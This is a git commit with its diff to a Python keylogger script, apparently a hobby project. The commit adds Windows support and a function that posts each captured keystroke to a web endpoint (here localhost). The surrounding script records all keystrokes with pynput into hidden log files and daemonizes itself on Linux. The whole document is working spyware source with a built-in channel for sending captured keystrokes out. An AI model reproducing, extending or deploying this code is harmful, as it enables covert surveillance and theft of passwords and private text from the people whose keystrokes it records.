207fc8616bdee87ca70035c9764a68915646e3ea
Zeyaad <148540407+zeyaadplaysgames@users.noreply.github.com>
2024-10-22 20:16:19 +0400

    Update keylogger.py
    added a feature that sends keylogs to a web server ran on my pc :D
    (might not be the most secure tho...)

--- keylogger.py
+++ keylogger.py
@@ -3,25 +3,39 @@ import sys
 import platform
 from pynput import keyboard
 from multiprocessing import Process
-import subprocess
+import requests
 
 os_name = platform.system()
 
+# Define log file path based on the operating system
 if os_name == 'Linux':
     log_file = os.path.expanduser("~/.keylog.txt")
+elif os_name == 'Windows':
+    log_file = os.path.join(os.getenv('APPDATA'), 'keylog.txt')
+else:
+    log_file = os.path.expanduser("~/keylog.txt")
+
+
+server_url = 'http://localhost/keylogs.php'
 
 def on_press(key):
     try:
+        
         with open(log_file, "a") as f:
             f.write(f"{key.char}")
+        
+        send_log(f"{key.char}")
     except AttributeError:
         with open(log_file, "a") as f:
             if key == keyboard.Key.space:
                 f.write(" ")
+                send_log(" ")
             elif key == keyboard.Key.enter:
                 f.write("\n")
+                send_log("\n")
             else:
                 f.write(f" [{key}] ")
+                send_log(f"[{key}]")
 
 def on_release(key):
     if key == keyboard.Key.esc:
@@ -30,6 +44,13 @@ def on_release(key):
 def start_keylogger():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+
+def send_log(log_data):
+    try:
+        # Send log data to the server via POST request
+        requests.post(server_url, data={'log': log_data})
+    except Exception as e:
+        print(f"Failed to send log data: {e}")
 
 def daemonize():
     if os.fork() > 0:
@@ -43,7 +64,5 @@ def daemonize():
     start_keylogger()
 
 if __name__ == "__main__":
-    if os_name =='Linux':
+    if os_name == 'Linux':
         Process(target=daemonize).start()
-        
-
